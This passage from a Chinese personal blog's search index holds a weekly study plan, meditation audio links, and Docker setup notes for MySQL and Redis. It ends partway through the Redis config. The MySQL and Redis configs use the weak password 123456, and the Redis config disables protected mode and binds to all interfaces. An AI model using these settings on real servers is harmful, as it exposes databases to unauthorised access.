<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023-07-1st-WeeklyPlan</title>
    <url>/2023/07/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023-07-1st-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023年7月第一周学习计划"><a href="#2023年7月第一周学习计划" class="headerlink" title="2023年7月第一周学习计划"></a>2023年7月第一周学习计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><p>1. </p>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><p>1. </p>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ul>
<li><p><input disabled="" type="checkbox"> 
开始实习任务</p>
</li>
<li><p><input disabled="" type="checkbox"> 
进行考研数学备考的规划</p>
</li>
</ul>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ul>
<li><p><input disabled="" type="checkbox"> 
刷14道算法题</p>
</li>
<li><p><input disabled="" type="checkbox"> 
准备操作系统的学习计划</p>
<ul>
<li><input disabled="" type="checkbox"> 挑选网课</li>
<li><input disabled="" type="checkbox"> 整理材料</li>
</ul>
</li>
<li><p><input disabled="" type="checkbox"> </p>
</li>
</ul>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li><input disabled="" type="checkbox"> 规划雅思的备考计划</li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><p><input disabled="" type="checkbox"> 
完成<strong>docker</strong>的学习</p>
</li>
<li><p><input disabled="" type="checkbox"> 
完善个人博客</p>
<ul>
<li><input disabled="" type="checkbox"> 读书笔记</li>
<li><input disabled="" type="checkbox"> 技术博客</li>
<li><input disabled="" type="checkbox"> 每日一句金句的整理</li>
<li><input disabled="" type="checkbox"> 个人的思考</li>
</ul>
</li>
<li><p><input disabled="" type="checkbox"> 
配置nacos</p>
</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li><input disabled="" type="checkbox"> 完成<strong>pr</strong>的学习</li>
<li><input disabled="" type="checkbox"> 看完一本书</li>
<li><input disabled="" type="checkbox"> 重新整理歌单</li>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>起的早就看书</li>
<li>思考一下个人的问题</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>冥想</li>
<li>刷算法题（一天两道）</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>科研内容</li>
<li>英语或者计算机理论学习</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>实习内容</li>
<li></li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>编写个人博客</li>
<li>学习技能</li>
<li>实习内容</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
        <category>2023年</category>
        <category>7月</category>
      </categories>
      <tags>
        <tag>7月</tag>
        <tag>2023年</tag>
      </tags>
  </entry>
  <entry>
    <title>冥想笔记</title>
    <url>/2023/11/19/%E5%85%B6%E4%BB%96%E6%8A%80%E8%83%BD/Untitled/</url>
    <content><![CDATA[<h1 id="冥想笔记"><a href="#冥想笔记" class="headerlink" title="冥想笔记"></a>冥想笔记</h1><p>【自习】A-身体静止，主动到被动_哔哩哔哩_bilibili</p>
<audio controls>
  <source src="/audio/A-身体静止，主动到被动_哔哩哔哩_bilibili.mp3" type="audio/mp3">
  Your browser does not support the audio element.
</audio>




<p>【自习】B-身体静止+专注呼吸_哔哩哔哩_bilibili</p>
<audio controls>
  <source src="/audio/【自习】B-身体静止+专注呼吸_哔哩哔哩_bilibili.mp3" type="audio/mp3">
  Your browser does not support the audio element.
</audio>

<p>【自习】C-专注呼吸+默念呼吸_哔哩哔哩_bilibili</p>
<audio controls>
  <source src="/audio/【自习】C-专注呼吸+默念呼吸_哔哩哔哩_bilibili.mp3" type="audio/mp3">
  Your browser does not support the audio element.
</audio>

<p>【自习】D-四四呼吸+感受呼吸_哔哩哔哩_bilibili</p>
<audio controls>
  <source src="/audio/【自习】D-四四呼吸+感受呼吸_哔哩哔哩_bilibili.mp3" type="audio/mp3">
  Your browser does not support the audio element.
</audio>

<p>【自习】E-身体静止+默念_哔哩哔哩_bilibili</p>
<audio controls>
  <source src="/audio/【自习】E-身体静止+默念_哔哩哔哩_bilibili.mp3" type="audio/mp3">
  Your browser does not support the audio element.
</audio>

<p>【自习】F-默念+等待念头_哔哩哔哩_bilibili</p>
<audio controls>
  <source src="/audio/【自习】F-默念+等待念头_哔哩哔哩_bilibili.mp3" type="audio/mp3">
  Your browser does not support the audio element.
</audio>

<p>【自习】G-四四呼吸+等待念头_哔哩哔哩_bilibili</p>
<audio controls>
  <source src="/audio/【自习】G-四四呼吸+等待念头_哔哩哔哩_bilibili.mp3" type="audio/mp3">
  Your browser does not support the audio element.
</audio>

<p>【特训】40分钟长坐_哔哩哔哩_bilibili</p>
<p><audio src="冥想音频/【特训】40分钟长坐_哔哩哔哩_bilibili.mp3"></audio></p>
]]></content>
      <categories>
        <category>冥想</category>
      </categories>
      <tags>
        <tag>冥想</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL学习笔记</title>
    <url>/2023/11/15/%E5%BE%AE%E6%9C%8D%E5%8A%A1/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="MySQL学习笔记"><a href="#MySQL学习笔记" class="headerlink" title="MySQL学习笔记"></a>MySQL学习笔记</h1><h2 id="docker安装MySQL"><a href="#docker安装MySQL" class="headerlink" title="docker安装MySQL"></a>docker安装MySQL</h2><h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  mysql:                                            <span class="comment">#mysql服务节点</span></span><br><span class="line">    image: mysql: <span class="number">5.7</span>.<span class="number">44</span>                            <span class="comment">#mysql镜像，如果镜像容器没有会去自动拉取</span></span><br><span class="line">    container_name: mysql                           <span class="comment">#容器的名称</span></span><br><span class="line">    command:                                        <span class="comment">#构建容器后所执行的命令</span></span><br><span class="line">      --character-set-server=utf8mb4</span><br><span class="line">      --collation-server=utf8mb4_unicode_ci</span><br><span class="line">      --lower-case-table-names=<span class="number">1</span>    <span class="comment">#忽略数据表明大小写 </span></span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: <span class="number">123456</span>                     <span class="comment">#设置root帐号密码</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="number">3306</span>:<span class="number">3306</span></span><br><span class="line">    volumes:</span><br><span class="line">      - ./data:/var/lib/mysql           <span class="comment">#数据文件挂载</span></span><br><span class="line">      - ./conf.d:/etc/mysql/conf.d      <span class="comment">#配置文件挂载</span></span><br><span class="line">      - ./logs:/var/log/mysql            <span class="comment">#日志文件挂载</span></span><br></pre></td></tr></table></figure>

<h3 id="my-cnf-x2F-conf-d-x2F-my-cnf"><a href="#my-cnf-x2F-conf-d-x2F-my-cnf" class="headerlink" title="my.cnf(.&#x2F;conf.d&#x2F;my.cnf)"></a>my.cnf(.&#x2F;conf.d&#x2F;my.cnf)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Copyright (c) 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line">#</span><br><span class="line"># This program is free software; you can redistribute it and/or modify</span><br><span class="line"># it under the terms of the GNU General Public License as published by</span><br><span class="line"># the Free Software Foundation; version 2 of the License.</span><br><span class="line">#</span><br><span class="line"># This program is distributed in the hope that it will be useful,</span><br><span class="line"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line"># GNU General Public License for more details.</span><br><span class="line">#</span><br><span class="line"># You should have received a copy of the GNU General Public License</span><br><span class="line"># along with this program; if not, write to the Free Software</span><br><span class="line"># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># The MySQL  Server configuration file.</span><br><span class="line">#</span><br><span class="line"># For explanations see</span><br><span class="line"># http://dev.mysql.com/doc/mysql/en/server-system-variables.html</span><br><span class="line"></span><br><span class="line"># Custom config should go here</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">#设置连接超时时间为21天</span><br><span class="line">wait_timeout=1814400</span><br><span class="line"></span><br><span class="line">#关闭binlog</span><br><span class="line">skip-log-bin</span><br><span class="line"></span><br><span class="line">#最大允许传输包的大小</span><br><span class="line">max_allowed_packet=20M</span><br><span class="line"></span><br><span class="line">#no case sensitive 这个仅mysql初始化时有效</span><br><span class="line">lower_case_table_names=1</span><br><span class="line"></span><br><span class="line">#no passwd</span><br><span class="line">#skip-grant-tables</span><br><span class="line"></span><br><span class="line">#最大连接数</span><br><span class="line">max_connections=5000</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line">host=localhost</span><br><span class="line">user=root</span><br><span class="line">password=123456</span><br><span class="line">#设置mysql客户端默认字符集</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"></span><br><span class="line">[mysqldump]</span><br><span class="line">#防止mysqldump导出出现警告</span><br><span class="line">host=localhost</span><br><span class="line">user=root</span><br><span class="line">password=123456</span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line">default-character-set=utf8mb4</span><br></pre></td></tr></table></figure>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h2 id="MySQL操作"><a href="#MySQL操作" class="headerlink" title="MySQL操作"></a>MySQL操作</h2><h3 id="启动MySQL"><a href="#启动MySQL" class="headerlink" title="启动MySQL"></a>启动MySQL</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure>

<h3 id="登入MySQL"><a href="#登入MySQL" class="headerlink" title="登入MySQL"></a>登入MySQL</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line"># 输入密码：</span><br><span class="line">00000000</span><br></pre></td></tr></table></figure>

<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h2 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h2><h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h2 id="高级操作"><a href="#高级操作" class="headerlink" title="高级操作"></a>高级操作</h2><h3 id="数据备份和恢复"><a href="#数据备份和恢复" class="headerlink" title="数据备份和恢复"></a>数据备份和恢复</h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="https://www.runoob.com/mysql/mysql-tutorial.html">https://www.runoob.com/mysql/mysql-tutorial.html</a>	“菜鸟教程”<br>[2]: <a href="https://tuonioooo-notebook.gitbook.io/docker/docker-compose/docker-compose%E5%AE%89%E8%A3%85mySql">https://tuonioooo-notebook.gitbook.io/docker/docker-compose/docker-compose%E5%AE%89%E8%A3%85mySql</a>	“docker-compose安装mySql”</p>
]]></content>
      <categories>
        <category>微服务</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>Mysql</tag>
        <tag>微服务</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记语法</title>
    <url>/2023/11/15/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Redis%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Redis学习笔记"><a href="#Redis学习笔记" class="headerlink" title="Redis学习笔记"></a>Redis学习笔记</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h4 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h4><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">    redis: </span><br><span class="line">        image: redis:<span class="number">6.2</span>.<span class="number">14</span></span><br><span class="line">        hostname: redis</span><br><span class="line">        container_name: redis</span><br><span class="line">        privileged: true</span><br><span class="line">        ports:</span><br><span class="line">          - <span class="number">6379</span>:<span class="number">6379</span></span><br><span class="line">        environment:</span><br><span class="line">          TZ: Asia/Shanghai</span><br><span class="line">        volumes:</span><br><span class="line">          - ./data:/data</span><br><span class="line">          - ./conf/redis.conf:/usr/local/redis/conf/redis.conf</span><br><span class="line">          - ./logs:/logs</span><br><span class="line">        command: [<span class="string">&quot;redis-server&quot;</span>,<span class="string">&quot;/usr/local/redis/conf/redis.conf&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="配置文件-x2F-conf-x2F-redis-conf"><a href="#配置文件-x2F-conf-x2F-redis-conf" class="headerlink" title="配置文件(.&#x2F;conf&#x2F;redis.conf)"></a>配置文件(.&#x2F;conf&#x2F;redis.conf)</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Redis配置文件样例</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Note on units: when memory size is needed, it is possible to specifiy</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">it <span class="keyword">in</span> the usual form of 1k 5GB 4M and so forth:</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 1k =&gt; 1000 bytes</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1kb =&gt; 1024 bytes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1m =&gt; 1000000 bytes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1mb =&gt; 1024*1024 bytes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1g =&gt; 1000000000 bytes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1gb =&gt; 1024*1024*1024 bytes</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># units are case insensitive so 1GB 1Gb 1gB are all the same.</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用<span class="built_in">yes</span>启用守护进程</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用守护进程后，Redis会把pid写到一个pidfile中，在/var/run/redis.pid</span></span><br><span class="line">daemonize no</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当Redis以守护进程方式运行时，Redis默认会把pid写入/var/run/redis.pid文件，可以通过pidfile指定</span></span><br><span class="line">pidfile /var/run/redis.pid</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定Redis监听端口，默认端口为6379</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果指定0端口，表示Redis不监听TCP连接</span></span><br><span class="line">port 6379</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">绑定的主机地址</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">你可以绑定单一接口，如果没有绑定，所有接口都会监听到来的连接</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">bind</span> 127.0.0.1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2、关闭保护机制</span></span><br><span class="line">protected-mode no</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify the path <span class="keyword">for</span> the unix socket that will be used to listen <span class="keyword">for</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">incoming connections. There is no default, so Redis will not listen</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">on a unix socket when not specified.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># unixsocket /tmp/redis.sock</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">unixsocketperm 755</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当客户端闲置多长时间后关闭连接，如果指定为0，表示关闭该功能</span></span><br><span class="line">timeout 0</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">debug (很多信息, 对开发／测试比较有用)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">verbose (many rarely useful info, but not a mess like the debug level)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">notice (moderately verbose, what you want <span class="keyword">in</span> production probably)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">warning (only very important / critical messages are logged)</span></span><br><span class="line">loglevel verbose</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">日志记录方式，默认为标准输出，如果配置为redis为守护进程方式运行，而这里又配置为标准输出，则日志将会发送给/dev/null</span></span><br><span class="line">logfile /logs/redis.log</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">To <span class="built_in">enable</span> logging to the system logger, just <span class="built_in">set</span> <span class="string">&#x27;syslog-enabled&#x27;</span> to <span class="built_in">yes</span>,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">and optionally update the other syslog parameters to suit your needs.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">syslog-enabled no</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify the syslog identity.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">syslog-ident redis</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify the syslog facility.  Must be USER or between LOCAL0-LOCAL7.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">syslog-facility local0</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置数据库的数量，默认数据库为0，可以使用<span class="keyword">select</span> &lt;dbid&gt;命令在连接上指定数据库<span class="built_in">id</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dbid是从0到‘databases’-1的数目</span></span><br><span class="line">databases 16</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">############################### SNAPSHOTTING  #################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Save the DB on disk:</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   save &lt;seconds&gt; &lt;changes&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   Will save the DB if both the given number of seconds and the given</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  number of write operations against the DB occurred.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   满足以下条件将会同步数据:</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  900秒（15分钟）内有1个更改</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  300秒（5分钟）内有10个更改</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  60秒内有10000个更改</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  Note: 可以把所有“save”行注释掉，这样就取消同步操作了</span></span><br><span class="line"> </span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定存储至本地数据库时是否压缩数据，默认为<span class="built_in">yes</span>，Redis采用LZF压缩，如果为了节省CPU时间，可以关闭该选项，但会导致数据库文件变的巨大</span></span><br><span class="line">rdbcompression yes</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定本地数据库文件名，默认值为dump.rdb</span></span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工作目录.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定本地数据库存放目录，文件名由上一个dbfilename配置项指定</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Also the Append Only File will be created inside this directory.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 注意，这里只能指定一个目录，不能指定文件名</span></span></span><br><span class="line">dir ./</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">################################ REPLICATION #################################</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主从复制。使用slaveof从 Redis服务器复制一个Redis实例。注意，该配置仅限于当前slave有效</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">so <span class="keyword">for</span> example it is possible to configure the slave to save the DB with a</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">different interval, or to listen to another port, and so on.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置当本机为slav服务时，设置master服务的ip地址及端口，在Redis启动时，它会自动从master进行数据同步</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">slaveof &lt;masterip&gt; &lt;masterport&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当master服务设置了密码保护时，slav服务连接master的密码</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下文的“requirepass”配置项可以指定密码</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">masterauth &lt;master-password&gt;</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">When a slave lost the connection with the master, or when the replication</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">is still <span class="keyword">in</span> progress, the slave can act <span class="keyword">in</span> two different ways:</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 1) if slave-serve-stale-data is set to &#x27;yes&#x27; (the default) the slave will</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   still reply to client requests, possibly with out of data data, or the</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   data <span class="built_in">set</span> may just be empty <span class="keyword">if</span> this is the first synchronization.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 2) if slave-serve-stale data is set to &#x27;no&#x27; the slave will reply with</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   an error <span class="string">&quot;SYNC with master in progress&quot;</span> to all the kind of commands</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   but to INFO and SLAVEOF.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">slave-serve-stale-data <span class="built_in">yes</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Slaves send PINGs to server <span class="keyword">in</span> a predefined interval. It<span class="string">&#x27;s possible to change</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">this interval with the repl_ping_slave_period option. The default value is 10</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">seconds.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># repl-ping-slave-period 10</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">The following option sets a timeout for both Bulk transfer I/O timeout and</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">master data or ping response timeout. The default value is 60 seconds.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># It is important to make sure that this value is greater than the value</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">specified for repl-ping-slave-period otherwise a timeout will be detected</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">every time there is low traffic between the master and the slave.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># repl-timeout 60</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">################################# SECURITY ###################################</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Warning: since Redis is pretty fast an outside user can try up to</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">150k passwords per second against a good box. This means that you should</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">use a very strong password otherwise it will be very easy to break.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过auth &lt;password&gt;命令提供密码，默认关闭</span></span></span><br><span class="line">requirepass 123456</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Command renaming.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># It is possilbe to change the name of dangerous commands in a shared</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">environment. For instance the CONFIG command may be renamed into something</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">of hard to guess so that it will be still available for internal-use</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">tools but not available for general clients.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># Example:</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># It is also possilbe to completely kill a command renaming it into</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">an empty string:</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string"></span></span></span><br><span class="line"><span class="string"><span class="language-bash"># rename-command CONFIG &quot;&quot;</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">################################## LIMITS ####################################</span></span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">如果设置maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max Number of clients 